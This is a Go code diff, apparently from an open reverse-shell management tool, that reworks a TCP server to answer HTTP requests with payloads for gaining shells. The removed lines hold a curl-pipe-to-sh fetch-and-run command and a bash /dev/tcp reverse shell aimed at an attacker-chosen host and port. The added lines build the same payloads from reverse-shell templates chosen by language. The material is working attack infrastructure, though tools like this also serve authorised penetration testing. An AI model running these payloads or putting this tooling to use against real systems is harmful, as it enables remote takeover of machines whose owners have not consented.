@@ -3,6 +3,7 @@ package context
 import (
 	"bytes"
 	"fmt"
+	"io/ioutil"
 	"net"
 	"os"
 	"strconv"
@@ -86,6 +87,7 @@ func (s *TCPServer) Run() {
 			listener.Close()
 			return
 		default:
+			var err error
 			conn, err := listener.Accept()
 			if err != nil {
 				continue
@@ -126,24 +128,51 @@ func (s *TCPServer) Run() {
 						httpHost = headerValue
 					}
 				}
-				var command string = fmt.Sprintf(
-					"curl http://%s/%s/%d|sh\n",
-					httpHost,
-					GetHostname(httpHost),
-					GetPort(httpHost, s.Port),
-				)
+
+				// eg:
+				//     "/python"        -> {"", "python"}
+				//     "/8.8.8.8/1337"        -> {"", "8.8.8.8", "1337"}
+				//     "/8.8.8.8/1337/python" -> {"", "8.8.8.8", "1337", "python"}
 				target := strings.Split(requestURI, "/")
-				if strings.HasPrefix(requestURI, "/") && len(target) == 3 {
-					host := target[1]
-					port, err := strconv.Atoi(target[2])
-					if err == nil {
-						command = fmt.Sprintf("bash -c 'bash -i >/dev/tcp/%s/%d 0>&1'\n", host, port)
-					} else {
+
+				// step 1: parse host and port, default set to the platypus listening port currently
+				host := GetHostname(httpHost)
+				var port uint16
+				port = GetPort(httpHost, s.Port)
+
+				if strings.HasPrefix(requestURI, "/") && len(target) > 2 {
+					host = target[1]
+					// TODO: ensure the format of port is int16
+					t, err := strconv.Atoi(target[2])
+					port = uint16(t)
+					if err != nil {
 						log.Debug("Invalid port number: %s", target[2])
 					}
 				} else {
 					log.Debug("Invalid HTTP Request-Line: %s", buffer[:n])
 				}
+
+				// step 2: parse language
+				language := "bash"
+				if len(target) > 0 {
+					// language is the last element of target
+					language = strings.Replace(target[len(target)-1], ".", "", -1)
+				}
+
+				// step 3: read template
+				// template rendering in golang tastes like shit,
+				// here we will trying to use string replace temporarily.
+				// read reverse shell template file from lib/template/rsh/*
+				templateFilename := fmt.Sprintf("lib/template/rsh/%s.tpl", language)
+				templateContent, _ := ioutil.ReadFile(templateFilename)
+
+				// step 4: render target host and port into template
+				renderedContent := string(templateContent)
+				renderedContent = strings.Replace(renderedContent, "__HOST__", host, -1)
+				renderedContent = strings.Replace(renderedContent, "__PORT__", strconv.Itoa(int(port)), -1)
+				command := fmt.Sprintf("%s\n", renderedContent)
+
+				// step 5: generate HTTP response
 				client.Write([]byte("HTTP/1.0 200 OK\r\n"))
 				client.Write([]byte(fmt.Sprintf("Content-Length: %d\r\n", len(command))))
 				client.Write([]byte("\r\n"))
